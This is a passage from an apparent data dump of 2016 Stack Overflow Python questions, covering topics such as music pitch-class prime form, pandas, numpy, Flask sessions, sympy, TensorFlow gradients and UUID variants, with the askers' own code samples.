<li><p>Arrange the pitch classes within a single octave span - (not necessarily octave register; octave register is understood to be always based on the pitch C, and octave span refers to a span of any two notes with a 2:1 frequency relationship, not just two Cs an octave apart.). As an example, we'd arrange (10, 9, 0, 11) as (0, 9, 10, 11) (starting on zero/within an octave register) or [9,10,11,0] (Normal form/leftmost-compact arrangement) or a few other ways that probably aren't as useful.</p></li>
<li><p>Find intervals - The interval in this case is the absolute value of the difference of adjacent pitch classes in a one octave: 9-10 or 10-9 = 1, 10-11 = 1, 0-11 = 1 (0 needs to be momentarily thought of as 12; this is a case where the numbers span across the loop point for the ""clock face"" of mod 12 and screw up the math), and 0-9 (0 is good as 0 here since it doesn't cross the loop point; if 0 is thought of as 12, you get the wrong interval) = 9. At this point, the difference of the first and last interval, in this case 9, is also considered in case there is a set like [3,4,7,9,0] or [1,2,4,5,7,8,10,11] where there is a tie between intervals. So you can't ignore the last interval.</p></li>
<li><p>Relist the intervals according to inversions and leftmost-compactness - This is why we found the intervals; the intervals abstractify the actual pitch so we don't have to transpose it to 0 (as the requirement of prime form is that the list starts on 0), and so we can list our intervals in the leftmost-compact fashion between the ""normal"" and ""inverted"" list of intervals (clockwise and counter-clockwise on a clockface) to calculate prime form. The way that a human would do this is to start at a point in the list of intervals and re-list it going left or right from that point, keeping the intervals in the same order as the pitches they correspond to and looping when necessary.</p>

<ol start=""5"">
<li>Choose the right interval list and calculate prime form -
(0,9,10,11)'s interval list is (9,1,1,1), what we do here is choose the leftmost compact version, which ignores the 9, since it is the least compact, and then use the intervals to build the prime form which is (0 1 2 3)</li>
</ol></li>
</ol>

<p>for (9,11,1,2,4,6,8), the interval list is (2,2,1,2,2,2,1). the most left compact is (1, 2, 2, 1, 2, 2, 2), so prime form is (0 1 3 5 6 8 10).</p>

<p>However, there is some disagreement on this final step, the disagreement is between the Rahn and Forte Algorithms. This is because the criteria I layed out results in two answers in five specific cases, because in those cases the question ""what is leftmost-compact?"" requires more definition. Honestly I have no clue if changing the tones_in_octave to something other than 12 will some how change these exceptions to the criteria I've presented out or not. I also don't know how to explain the differences between the two algorithms in terms of intervals, because the algorithms are defined based on certain pitch's intervals from 0 that cause disagreement between what is leftmost-compact, not the actual order of intervals. I guess I should work on that if I want to finish this program.</p>

<p>Python seems to be good at following these steps from what I have been shown by Stack Overflow and other sources (except maybe the interval list sorting), it's just a matter of figuring out how to generalize it enough so that the function works for a potentially infinite amount of arguments. Thanks to Moses Koledoye doing most of the heavy lifting by generalizing the function to work with *args, there seems to be only one problem that hasn't been solved, which is sorting the list of intervals in the fashion shown above in step 4. (the rest of the steps work pretty well; Koledoye's version of step 3 gave the wrong intervals, but applying mod 12 to the answer he came up with sometimes fixes that for cases where step 4 happens to work out correctly (AND SOME TIMES SCREWS IT UP).</p>

<p>Here is the code with a flawed step 4, print messages to notify what just got defined, and an extra step at the end that SOMETIMES fixes cases where step 3 doesn't work correctly due to, I presume, math across the ""loop point""/""clockface"", and other times messes it up when it was correct with Koledoye's code.</p>

<pre><code>def prime_form (*pitches, tones_in_octave = 12):
    tones_in_octave=int(tones_in_octave)
    spitches = list(set(sorted([pitch %tones_in_octave for pitch in list(pitches)])))
    print('{}\nthis is the sorted list of pitches \n'.format(spitches))

    lth = len(spitches)
    print('{}\nthis is the length of spitches \n'.format(lth))

    intervals = [(spitches[0 if (i+1) &gt;= lth else (i+1)]-x) % tones_in_octave for i, x in enumerate(spitches)]    
    print('{}\nthis is the interval list \n'.format(intervals))

    sintervals = sorted(intervals)
    print('{}\nthis is the sorted interval list \n'.format(sintervals))

    p_form = [sum(sintervals[:i]) for i in range(len(intervals))]
    print('{}\nthis may be the prime form, but maybe not \n'.format(p_form))

    true_p_form = list({i % tones_in_octave for i in p_form})
    print('({})\nthis is the prime form! (apparently it might not be)'.format(' '.join(map(str, true_p_form))
</code></pre>

<p>and here are some examples to try</p>

<pre><code>&gt;&gt;&gt; prime_form(9, 3, 0)
(0 3 6)
this is the prime form!

&gt;&gt;&gt; prime_form(1, 11, 9, 4, 2, 6, 8)
(0 1 3 5 6 8 10)
this is the prime form!

&gt;&gt;&gt; prime_form(10, 9, 0, 11)
(0 1 2 3)
this is the prime form!
</code></pre>

<p>And here is a calculator that already does most of this and more (except changing the number of tones in the octave)
<a href=""http://composertools.com/Tools/PCSets/setfinder.html"" rel=""nofollow"">http://composertools.com/Tools/PCSets/setfinder.html</a></p>

<p>It even has an explanation on the difference between the Rahn and Forte algorithms.</p>
"
39960941,6655092.0,2016-10-10 14:45:28+00:00,3,"Python best practice: series of ""or""s or ""in""?","<p>I am working on a <a href=""https://github.com/johnroper100/CrowdMaster/pull/17"" rel=""nofollow"">project</a> where a question came up about the following line:</p>

<pre><code>a == ""EQUAL"" or a == ""NOT EQUAL"" or a == ""LESS"" or a == ""GREATER""
</code></pre>

<p>I proposed a change to make it ""simpler"" like so:</p>

<pre><code>a in [""EQUAL"", ""NOT EQUAL"", ""LESS"", ""GREATER""]
</code></pre>

<p>What would be considered best practice and what would be best for performance? This is for user interface code that gets updated frequently so minor performance improvements could be noticeable. I know the first example will ""fail fast"" if any were found, and I am assuming that the second would as well. </p>

<p>Furthermore, wouldn't it be even faster to use a dict like:</p>

<pre><code>a in {""EQUAL"", ""NOT EQUAL"", ""LESS"", ""GREATER""}
</code></pre>

<p>...so that a list wouldn't need to be constructed?</p>

<p>The only thing PEP-8 says (that I could find):</p>

<blockquote>
  <p>...code is read much more often than it is written. The guidelines provided here are intended to improve the readability of code...</p>
  
  <p>However, know when to be inconsistent -- sometimes style guide recommendations just aren't applicable. When in doubt, use your best judgment. Look at other examples and decide what looks best.</p>
</blockquote>
"
39688927,1115237.0,2016-09-25 16:02:15+00:00,3,Python - tf-idf predict a new document similarity,"<p>Inspired by <strong><a href=""http://stackoverflow.com/questions/12118720/python-tf-idf-cosine-to-find-document-similarity"">this</a></strong> answer, I'm trying to find cosine similarity between a trained trained tf-idf vectorizer and a new document, and return the similar documents.</p>

<p>The code below finds the cosine similarity of the <strong>first vector</strong> and not a new query</p>

<pre><code>&gt;&gt;&gt; from sklearn.metrics.pairwise import linear_kernel
&gt;&gt;&gt; cosine_similarities = linear_kernel(tfidf[0:1], tfidf).flatten()
&gt;&gt;&gt; cosine_similarities
array([ 1.        ,  0.04405952,  0.11016969, ...,  0.04433602,
    0.04457106,  0.03293218])
</code></pre>

<p>Since my train data is huge, looping through the entire trained vectorizer sounds like a bad idea.
How can I infer the vector of a new document, and find the related docs, same as the code below?</p>

<pre><code>&gt;&gt;&gt; related_docs_indices = cosine_similarities.argsort()[:-5:-1]
&gt;&gt;&gt; related_docs_indices
array([    0,   958, 10576,  3277])
&gt;&gt;&gt; cosine_similarities[related_docs_indices]
array([ 1.        ,  0.54967926,  0.32902194,  0.2825788 ])
</code></pre>
"
39880411,293594.0,2016-10-05 17:36:56+00:00,3,Testing students' code in Jupyter with a unittest,"<p>I'd like my students to be able to check their code as they write it in a Jupyter Notebook by calling a function from an imported module which runs a unittest. This works fine unless the function needs to be checked against objects which are to be picked up in the global scope of the Notebook.</p>

<p>Here's my <code>check_test</code> module:</p>

<pre><code>import unittest
from IPython.display import Markdown, display

def printmd(string):
    display(Markdown(string))

class Tests(unittest.TestCase):

    def check_add_2(self, add_2):
        val = 5
        self.assertAlmostEqual(add_2(val), 7)

    def check_add_n(self, add_n):
        n = 6
        val = 5
        self.assertAlmostEqual(add_n(val), 11)


check = Tests()
def run_check(check_name, func, hint=False):
    try:
        getattr(check, check_name)(func)
    except check.failureException as e:
        printmd('**&lt;span style=""color: red;""&gt;FAILED&lt;/span&gt;**')
        if hint:
            print('Hint:',  e)
        return
    printmd('**&lt;span style=""color: green;""&gt;PASSED&lt;/span&gt;**')
</code></pre>

<p>If the Notebook is:</p>

<pre><code>In [1]: def add_2(val):
            return val + 2

In [2]: def add_n(val):
            return val + n

In [3]: import test_checks

In [4]: test_checks.run_check('check_add_2', add_2)
        PASSED

In [5]: test_checks.run_check('check_add_n', add_n)
        !!! ERROR !!!
</code></pre>

<p>The error here is not suprising: <code>add_n</code> doesn't know about the <code>n</code> I defined in <code>check_add_n</code>.</p>

<p>So I got to thinking I could do something like:</p>

<pre><code>In [6]: def add_n(val, default_n=None):
            if default_n:
                n = default_n
            return val + n
</code></pre>

<p>in the Notebook, and then passing <code>n</code> in the test:</p>

<pre><code>    def check_add_n(self, add_n):
        val = 5
        self.assertAlmostEqual(add_n(val, 6), 11)
</code></pre>

<p>But this is causing me <code>UnboundLocalError</code> headaches down the line because of the assignment of <code>n</code>, even within an <code>if</code> clause: this is apparently stopping the Notebook from picking up <code>n</code> in global scope when it's needed.</p>

<p>For the avoidance of doubt, I don't want insist that <code>n</code> is passed as an argument to <code>add_n</code>: there could be many such objects used but not changed by the function being tested and I want them resolved in the outer scope.</p>

<p>Any ideas how to go about this?</p>
"
39928716,1391717.0,2016-10-08 04:35:46+00:00,3,How to delete Flask HTTP Sessions from the Database on session.clear(),"<p>I implemented a server side Session in Flask with SQLAlchemy based on this <a href=""http://flask.pocoo.org/snippets/110/"" rel=""nofollow"">snippit</a>:</p>

<pre><code>class SqlAlchemySession(CallbackDict, SessionMixing):
    ...

class SqlAlchemySessionInterface(SessionInterface):
    def __init__(self, db):
        self.db = db

    def open_session(self, app, request):
        ...

    def save_session(self, app, session, response):
        ...
</code></pre>

<p>Everything works as expected. When the user logs in, a session is stored in the database, and the session id is placed in a cookie and returned to the user. When the user logs out, <code>session.clear()</code> is called, and the cookie is removed from the user.</p>

<p>However, the session is not deleted from the database. I was hoping that I could implement this logic in my <code>SqlAlchemySessionInterface</code> class, as opposed to defining a function and calling this instead of <code>session.clear()</code>.</p>

<p>Likewise, in the <a href=""https://github.com/pallets/flask/blob/master/flask/sessions.py"" rel=""nofollow"">sessions.py</a> code, there isn't any reference to <code>clear</code>, and the only time a cookie is deleted is <a href=""https://github.com/pallets/flask/blob/master/flask/sessions.py"" rel=""nofollow"">if the session was modified</a>.</p>

<p>The <a href=""http://flask.pocoo.org/docs/0.11/api/#sessions"" rel=""nofollow"">API documentation for sessions</a> also doesn't indicate how the <code>clear</code> method works.</p>

<p>Would anyone know of a way of accomplishing this, other than replacing all my calls to <code>session.clear()</code> with:</p>

<pre><code>def clear_session():
    sid = session.get('sid')
    if sid:
        db.session.query(DBSession).filter_by(sid=sid).delete()
        db.session.commit()
    session.clear()
</code></pre>
"
39959889,6888086.0,2016-10-10 13:50:51+00:00,3,Nullable type (C#) in Python for .NET,"<p>I'm currently working on a project in Python (for .NET) that calls functions from a C# .dll. There's a nullable type (double?) argument in one of the C# functions and apparently I have to edit the python source code (<a href=""http://stackoverflow.com/questions/26742837/creating-a-c-sharp-nullable-int32-within-python-using-python-net-to-call-a-c-s"">Creating a C# Nullable Int32 within Python (using Python.NET) to call a C# method with an optional int argument</a>), which I'd prefer not to do in case other people will use this nor do I want to update the C# code to handle this case of conversion.</p>

<p>For now, I've tried the following:</p>

<pre><code>nullable_double = System.Nullable[System.Double]()
func(nullable_double)
</code></pre>

<p>This gives me the following error:</p>

<pre><code>ArgumentException: Object of type 'System.RuntimeType' cannot be converted to type 'System.Nullable`1[System.Double]'.
</code></pre>

<p>I also tried just passing in 'None' but that didn't work as well. Is there anyway I can do this without changing the python source code or the c# dll? </p>
"
39690742,828602.0,2016-09-25 19:09:25+00:00,3,Convert float to int and leave nulls,"<p>I have the following dataframe, I want to convert values in column 'b' to integer</p>

<pre><code>    a   b       c
0   1   NaN     3
1   5   7200.0  20
2   5   580.0   20
</code></pre>

<p>The following code is throwing exception 
""ValueError: Cannot convert NA to integer""</p>

<pre><code>df['b'] = df['b'].astype(int)
</code></pre>

<p>How do i convert only floats to int and leave the nulls as is?</p>
"
39907315,5225453.0,2016-10-06 23:49:43+00:00,3,Replace duplicate values across columns in Pandas,"<p>I have a simple dataframe as such:  </p>

<pre><code>df = [    {'col1' : 'A', 'col2': 'B', 'col3':   'C', 'col4':'0'},
          {'col1' : 'M', 'col2':   '0', 'col3': 'M', 'col4':'0'},
          {'col1' : 'B', 'col2':  'B', 'col3':  '0', 'col4':'B'},
          {'col1' : 'X', 'col2':  '0', 'col3':  'Y', 'col4':'0'}
          ]
df = pd.DataFrame(df)
df = df[['col1', 'col2', 'col3', 'col4']]
df  
</code></pre>

<p>Which looks like this:  </p>

<pre><code>| col1 | col2 | col3 | col4 |
|------|------|------|------|
| A    | B    | C    | 0    |
| M    | 0    | M    | 0    |
| B    | B    | 0    | B    |
| X    | 0    | Y    | 0    |
</code></pre>

<p>I just want to replace repeated characters with the character '0', across the rows. It boils down to keeping the first duplicate value we come across, as like this:  </p>

<pre><code>| col1 | col2 | col3 | col4 |
|------|------|------|------|
| A    | B    | C    | 0    |
| M    | 0    | 0    | 0    |
| B    | 0    | 0    | 0    |
| X    | 0    | Y    | 0    |
</code></pre>

<p>This seems so simple but I'm stuck. Any nudges in the right direction would be really appreciated.  </p>
"
40097711,5090081.0,2016-10-18 00:32:05+00:00,3,Making a list of mouse over event functions in Tkinter,"<p>I'm making a GUI for a medical tool as a class project. Given a condition, it should output a bunch of treatment options gathered from different websites like webMD. I would like to be able to handle mouseover events on any of the treatments listed to give a little more information about the treatment (such as the category of drug, whether it is a generic or not, etc).</p>

<p>The labels are stored in a list, as I have no idea how many different treatments will be returned beforehand. So my question is how can I make these mouseover events work. I can't write a function definition for every single possible label, they would number in the hundreds or thousands. I'm sure there's a very pythonic way to do it, but I have no idea what.</p>

<p>Here's my code for creating the labels:</p>

<pre><code>    def search_click():
        """"""
        Builds the search results after the search button has been clicked
        """"""
        self.output_frame.destroy()                                                 # Delete old results
        build_output()                                                              # Rebuild output frames
        treament_list = mockUpScript.queryConditions(self.condition_entry.get())    # Get treatment data
        labels = []
        frames = [self.onceFrame, self.twiceFrame, self.threeFrame, self.fourFrame] # holds the list of frames
        for treament in treament_list:                                              # For each treatment in the list
            label = ttk.Label(frames[treament[1] - 1], text=treament[0])            # Build the label for treatment

            labels.append(label)                                                    # Add the treatment to the list
            label.pack()        
</code></pre>

<p>and here is what the GUI looks like (don't judge [-; )<a href=""https://i.stack.imgur.com/RXFyL.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/RXFyL.png"" alt=""GUI image""></a></p>

<p>The text ""Hover over drugs for information"" should be changed depending on which drug your mouse is hovering over.</p>
"
39692769,4790871.0,2016-09-25 23:24:21+00:00,3,Efficient numpy indexing: Take first N rows of every block of M rows,"<pre><code>x = np.array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15])
</code></pre>

<p>I want to grab first 2 rows of array x from every block of 5, result should be:</p>

<pre><code>x[fancy_indexing] = [1,2, 6,7, 11,12]
</code></pre>

<p>It's easy enough to build up an index like that using a for loop.</p>

<p>Is there a one-liner slicing trick that will pull it off? Points for simplicity here.</p>
"
39590942,4442084.0,2016-09-20 09:50:48+00:00,3,Is there any performance reason to use ndim 1 or 2 vectors in numpy?,"<p>This seems like a pretty basic question, but I didn't find anything related to it on stack. Apologies if I missed an existing question.</p>

<p>I've seen some mathematical/linear algebraic reasons why one might want to use numpy vectors ""proper"" (i.e. ndim 1), as opposed to row/column vectors (i.e. ndim 2).</p>

<p>But now I'm wondering: are there any (significant) <strong>efficiency</strong> reasons why one might pick one over the other? Or is the choice pretty much arbitrary in that respect? </p>

<p>(edit) To clarify: By ""ndim 1 vs ndim 2 vectors"" I mean representing a vector that contains, say, numbers 3 and 4 as either:</p>

<ul>
<li><p>np.array([3, 4]) # ndim 1</p></li>
<li><p>np.array([[3, 4]]) # ndim 2</p></li>
</ul>

<p>The numpy documentation seems to lean towards the first case as the default, but like I said, I'm wondering if there's any <em>performance</em> difference.</p>
"
39907806,5076711.0,2016-10-07 00:56:47+00:00,3,Word guessing game -- Can this be written any better?,"<p>This is just a portion of the game, a function that takes in the secret word and the letters guessed as arguments and tells you if they guessed the word correctly.</p>

<p>I'll be completely honest, this is from an assignment on an edX course, <strong>however</strong> I have already passed this assignment, this code works. I am just wondering if it can be written any better. Some people in the discussion forums were talking about how they solved it with 1 line, which is why I'm asking.</p>

<pre class=""lang-py prettyprint-override""><code>def isWordGuessed(secretWord, lettersGuessed):
    guessed = []
    l= str(lettersGuessed)
    s= list(secretWord)
    for i in l:
        if i in s:
            guessed.append(i)
            guessed.sort()
            s.sort()
    return guessed == s
</code></pre>

<p>Here is one of the test cases from the grader as an example:</p>

<p><code>isWordGuessed('durian', ['h', 'a', 'c', 'd', 'i', 'm', 'n', 'r', 't', 'u'])</code></p>
"
40086386,3142347.0,2016-10-17 12:27:48+00:00,3,Pandas to_sql() not working with Posgresql - value too long for type character varying,"<p>I'm using Pandas with SQLAlchemy to apply some ETL on one CSV file</p>

<p>After validating the fields and transforming some of them I try to export to my PostgreSQL database, but I'm getting one error which does not make sense:</p>

<pre><code>sqlalchemy.exc.DataError: (psycopg2.DataError) value too long for type character varying(50)
</code></pre>

<p>I already changed the field to many values (it was initially setup as 15). I tried to get <code>NaN</code> values for that field and replacing with '' (there was only one field). For that I used:</p>

<pre><code>&gt;&gt;&gt; df.loc[df['foo'].isnull(), 'foo'] = ''
</code></pre>

<p>I tried changing the <code>chunksize</code> to 5000 and 1000. Initially, it was not set.</p>

<pre><code>&gt;&gt;&gt; df.to_sql(""mytable"", con, index=False, if_exists='append', chunksize=1000)
</code></pre>

<p>The command above worked with <code>sqlite</code></p>

<p>After having those problems I checked the column which was throwing the error again to see if there was any problem with its length. Apparently, it did not, but I ran the following code anyway:</p>

<pre><code>&gt;&gt;&gt; df.foo.str.len().max() 
11.0
</code></pre>

<p>I also tried the following:</p>

<pre><code>&gt;&gt;&gt; df.fillna(value='', inplace=True)
&gt;&gt;&gt; df['foo'] = df['foo'].str.strip()
</code></pre>

<p>Then I also added</p>

<pre><code>for f in Inventory._meta.get_fields():
    if f.get_internal_type() == 'CharField':
        df[f.name] = df[f.name].str[:f.max_length]
</code></pre>

<p>But it did not work either</p>

<p>I finally put the length of the column to 100, but this is not right. The field contains only 11 char per row. I ran out of ideas. This error is strange, and I'd appreciate some help.</p>
"
39828366,3331879.0,2016-10-03 09:26:31+00:00,3,Using grep to compare two lists of Python packages,"<p>I want to generate the list of packages install in Python 3, the list of all packages in Python 2.7 and find all entries in the 2.7 list <em>not</em> in the Python 3 list.</p>

<p>Generating the list is easy: <code>pip freeze</code> or <code>pip3.4 freeze</code>.</p>

<p>Searching for a package in the list is equally trivial <code>pip freeze | grep ""wheel""</code> for example</p>

<p>However, if I want to search for intersections between the list, or in this instance <em>non</em>-intersections I would expect to use something like this <code>pip freeze | grep -n pip3.4 freeze</code></p>

<p>However it tells me that, obviously the parameter for grep <code>...is not a file or directory</code>. My shell scripting is rusty and I vaguely remember there should be a simple way of doing this other than piping both lists to files?</p>
"
39665207,5522060.0,2016-09-23 16:09:18+00:00,3,Define a variable in sympy to be a CONSTANT,"<pre><code>from sympy import *
from sympy.stats import *
mu, Y = symbols('mu Y', real = True, constant = True)
sigma = symbols('sigma', real = True, positive=True)
X = Normal('X', mu, sigma)
</code></pre>

<p>When asking for:</p>

<pre><code>E(X, evaluate=False)
</code></pre>

<p>I get:</p>

<pre><code>â                     
â                      
â®                2    
â®        -(X - Î¼)     
â®        ââââââââââ   
â®              2      
â®           2âÏ       
â®  â2âXââ¯             
â®  ââââââââââââââââ dX
â®       2ââÏâÏ        
â¡                     
-â 
</code></pre>

<p>Which is what I expect. When asking for:</p>

<pre><code>E(X, X&gt;0, evaluate=False)
E(X, X&gt;pi, evaluate=False)
E(X, X &gt;-3, evaluate=False)
</code></pre>

<p>Using any constant, the result is as expected from the Normal Definition of conditional expectation. However, when trying to solve for:</p>

<pre><code>E(X, X&gt;Y)
</code></pre>

<p>I'm getting an error that has to do with roots. Is there a way to define a Y, such that sympy acknowledges that it is a constant, just like a 0 or a -3 or even pi, and shows the integration as expected? I'm assuming the problem with the request I have from sympy is that somehow the Y isn't acknowledges as a constant and therefore, when trying to solve this request, sympy is faced with a roots problem.</p>
"
39644604,6742284.0,2016-09-22 16:43:56+00:00,3,How to divide an http response into chunks?,"<p>I'm trying to create a multithreaded downloader using python. Lets say I have a link to a video of size 100MB and I want to download it using 5 threads with each thread downloading 20MB simultaneously. For that to happen I have to divide the initial response to 5 parts which represents different parts of the file (like this 0-20MB, 20-40MB, 40-60MB, 60-80MB, 80-100MB), I searched and found http range headers might help.
Here's the sample code</p>

<pre><code>from urllib.request import urlopen,Request
url= some video url
header = {'Range':'bytes=%d-%d' % (5000,10000)} # trying to capture all the bytes in between 5000th and 1000th byte.
req=Request(url,headers=header)
res=urlopen(req)
r=res.read()
</code></pre>

<p>But the above code is reading the whole video instead of the bytes I wanted and it clearly isn't working. So is there any way to read specified range of bytes in any part of the video instead of reading from the start ? Please try to explain in simple words.</p>
"
40132067,2054138.0,2016-10-19 12:57:50+00:00,3,"Python user input inside infinite loop too slow, easily confused","<p>I have a Python script running on a Raspberry Pi that sits waiting for user input and records the input in a SQLite database:</p>

<pre><code>#!/usr/bin/env python

import logging
import db

while True:
    barcode = raw_input(""Scan ISBN: "")
    if ( len(barcode) &gt; 1 ):
        logging.info(""Recording scanned ISBN: "" + barcode)
        print ""Recording scanned ISBN: "" + barcode
        db.recordScan(barcode, 1)
</code></pre>

<p>That <code>db.recordScan()</code> method looks like this:</p>

<pre><code># Adds an item to queue
def recordScan(isbn, shop_id):
    insert = ""INSERT INTO scans ( isbn, shop_id ) VALUES ( ?, ? )""
    conn = connect()
    conn.cursor().execute(insert, [isbn, shop_id])
    conn.commit()
    conn.close()
</code></pre>

<p><em>(Note: The whole code repo is available at <a href=""https://github.com/martinjoiner/bookfetch-scanner-python/"" rel=""nofollow"">https://github.com/martinjoiner/bookfetch-scanner-python/</a> if you wanna see how I'm connecting to the db and such)</em> </p>

<p>My problem is that using a USB barcode scanner (which is effectively just a keyboard input that sends a series of keystrokes followed by the <code>Enter</code> key) it is really easy to input at such a fast rate that the command line seems to get <em>""confused""</em>. </p>

<p><strong>For example compare the following results...</strong> </p>

<p>When you go slow the script works well and the command looks neat like this:</p>

<pre><code>Scan ISBN: 9780465031467
Recording scanned ISBN: 9780465031467
Scan ISBN: 9780141014593
Recording scanned ISBN: 9780141014593
Scan ISBN: 
</code></pre>

<p>But when you hammer it hard and go really fast the input prompt kind of gets ahead of itself and the messages printed by the script get written on top of the input prompt:</p>

<pre><code>Recording scanned ISBN: 9780141014593
9780141014593
9780141014593
9780465031467
Recording scanned ISBN: 9780141014593
Scan ISBN: Recording scanned ISBN: 9780141014593
Scan ISBN: Recording scanned ISBN: 9780141014593
Scan ISBN: Recording scanned ISBN: 9780465031467
Scan ISBN: 9780571273188
9780141014593
</code></pre>

<p>It sometimes hangs in that position indefinitely, I don't know what it's doing but you can wake it back up again with another input and it carries on as normal although the input before the one it hung on doesn't get recorded which is bad because it makes the whole system unreliable. </p>

<p>My question is: Is this an inevitability that I just have to live with? Will I always be able to out-pace the low-powered Raspberry Pi by hitting it with too many inputs in close succession or is there some faster way of doing this? Can I push the database write operation to another thread or something along those lines? Forgive my ignorance, I am learning. </p>
"
39905702,779516.0,2016-10-06 21:12:00+00:00,3,Closed lines in matplotlib contour plots,"<p>When looking closely at contour plots made with matplotlib, I noticed that smaller contours have inaccurate endpoints which do not close perfectly in PDF figures.  Consider the minimal example:</p>

<pre><code>plt.gca().set_aspect('equal')
x,y = np.meshgrid(np.linspace(-1,1,100), np.linspace(-1,1,100))
r = x*x + y*y
plt.contour(np.log(r))
plt.savefig(""test.pdf"")
</code></pre>

<p>The central part of the resulting test.pdf file, shown below, clearly shows the problem.  Is there a way to solve this or is it a bug/intrinsic inaccuracy of matploplib?</p>

<p><a href=""http://i.stack.imgur.com/NJWKC.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/NJWKC.png"" alt=""enter image description here""></a></p>
"
39966239,6951104.0,2016-10-10 20:28:23+00:00,3,How do you use multiple arguments in {} when using the .format() method in Python,"<p>I want a table in python to print like this: </p>

<p><img src=""https://i.imgur.com/ymGkIdQ.png"" alt=""""></p>

<p>Clearly, I want to use the .format() method, but I have long floats that look like this: <code>1464.1000000000001</code> I need the floats to be rounded, so that they look like this: <code>1464.10</code> (always two decimal places, even if both are zeros, so I can't use the round() function).</p>

<p>I can round the floats using <code>""{0:.2f}"".format(""1464.1000000000001"")</code>, but then they do not print into nice tables. </p>

<p>I can put them into nice tables by doing <code>""{0:&gt;15}.format(""1464.1000000000001"")</code>, but then they are not rounded.</p>

<p>Is there a way to do both? Something like <code>""{0:&gt;15,.2f}.format(""1464.1000000000001"")</code>?</p>
"
39966149,821806.0,2016-10-10 20:22:41+00:00,3,How to directly set the gradient of a layer before backpropagation?,"<p>Imagine a tiny network defined as follows, where linear is a typical helper function defining TensorFlow variables for a weight matrix and activation function:</p>

<p><code>final_layer = linear(linear(_input,10,tf.nn.tanh),20)</code></p>

<p>Normally this would be optimized via gradient descent on a loss:</p>

<p><code>loss = tf.reduce_sum(tf.square(final_layer - _target))
train_step = tf.train.AdamOptimizer().minimmize(loss)</code></p>

<p>But assume I'm getting the derivatives of the loss w.r.t. final_layer from an external  source (e.g. a tf.placeholder named _deriv). How can I use this gradient information with one of the builtin optimizers to backpropagate and update the network parameters?</p>

<p>The workaround I'm currently using is to construct an artificial loss consisting of the inner product between _deriv and final_layer (since the derivatives of this loss w.r.t. final_layer will be equal to _deriv). </p>

<p><code>loss = tf.reduce_sum(final_layer*_deriv)
train_step = tf.train.AdamOptimizer().minimmize(loss)</code></p>

<p>This is very wasteful though, as it needs to do this unnecessary inner product and calculate its derivative for every training step even though I already know this information. Is there a better way?</p>

<p>For those thinking this an odd thing to need to do, it is necessary for implementing <a href=""https://arxiv.org/abs/1608.05343"" rel=""nofollow"">synthetic gradients</a>.</p>
"
40063580,6137338.0,2016-10-15 19:55:17+00:00,3,Pandas flatten hierarchical index on non overlapping columns,"<p>I have a dataframe, and I set the index to a column of the dataframe. This creates a hierarchical column index. I want to flatten the columns to a single level. Similar to this question - <a href=""http://stackoverflow.com/questions/14507794/python-pandas-how-to-flatten-a-hierarchical-index-in-columns"">Python Pandas - How to flatten a hierarchical index in columns</a>, however, the columns do not overlap (i.e. 'id' is not at level 0 of the hierarchical index, and other columns are at level 1 of the index).</p>

<pre><code>df = pd.DataFrame([(101,3,'x'), (102,5,'y')], columns=['id', 'A', 'B'])
df.set_index('id', inplace=True)

      A    B
id
101   3    x
102   5    y
</code></pre>

<p>Desired output is flattened columns, like this:</p>

<pre><code>id    A    B
101   3    x
102   5    y
</code></pre>
"
39832721,995862.0,2016-10-03 13:22:41+00:00,3,Meaning of self.__dict__ = self in a class definition,"<p>I'm trying to understand the following snippet of code:</p>

<pre><code>class Config(dict):
    def __init__(self):
        self.__dict__ = self
</code></pre>

<p>What is the purpose of the line <code>self.__dict__ = self</code>? I suppose it overrides the default <code>__dict__</code> function with something that simply returns the object itself, but since <code>Config</code> inherits from <code>dict</code> I haven't been able to find any difference with the default behavior.</p>
"
39832773,4393898.0,2016-10-03 13:25:10+00:00,3,Getting previous index values of a python list items after shuffling,"<p>Let's say I have such a python list:</p>

<pre><code>l = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
</code></pre>

<p>by using <code>random.shuffle</code>, </p>

<pre><code>&gt;&gt;&gt; import random
&gt;&gt;&gt; random.shuffle(l)
&gt;&gt;&gt; l
[5, 3, 2, 0, 8, 7, 9, 6, 4, 1]
</code></pre>

<p>I am having the above list.</p>

<p>How can I get the previous index values list of each item in the shuffled list? </p>
"
39644748,6200592.0,2016-09-22 16:53:10+00:00,3,Notation for intervals?,"<p>I want to make a Python class for intervals of real numbers. Syntax most closely related to mathematical notation would be <code>Interval([a, b))</code> or, even better, <code>Interval[a, b)</code> to construct the interval of all real <code>x</code> satisfying <code>a &lt;= x &lt; b</code>.</p>

<p>Is it possible to construct a class that would handle this syntax? </p>
"
39908518,2617068.0,2016-10-07 02:37:03+00:00,3,When would a UUID variant be an integer?,"<p>The <a href=""https://docs.python.org/3.5/library/uuid.html"" rel=""nofollow"">documentation on the <code>uuid</code> module</a> says:</p>

<blockquote>
  <p><code>UUID.</code><strong><code>variant</code></strong> <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.UUID.variant"" rel=""nofollow"">Â¶</a></p>
  
  <p>The UUID variant, which determines the internal
  layout of the UUID. This will be one of the integer constants
  <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RESERVED_NCS"" rel=""nofollow"">RESERVED_NCS</a>,
  <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RFC_4122"" rel=""nofollow"">RFC_4122</a>,
  <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RESERVED_MICROSOFT"" rel=""nofollow"">RESERVED_MICROSOFT</a>,
  or
  <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RESERVED_FUTURE"" rel=""nofollow"">RESERVED_FUTURE</a>.</p>
</blockquote>

<p>And later:</p>

<blockquote>
  <p><code>uuid.</code><strong><code>RESERVED_NCS</code></strong> <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RESERVED_NCS"" rel=""nofollow"">Â¶</a></p>
  
  <p>Reserved for NCS compatibility.</p>
  
  <p><code>uuid.</code><strong><code>RFC_4122</code></strong> <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RFC_4122"" rel=""nofollow"">Â¶</a></p>
  
  <p>Specifies the UUID layout given in <a href=""https://tools.ietf.org/html/rfc4122.html"" rel=""nofollow"">RFC 4122</a>.</p>
  
  <p><code>uuid.</code><strong><code>RESERVED_MICROSOFT</code></strong> <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RESERVED_MICROSOFT"" rel=""nofollow"">Â¶</a></p>
  
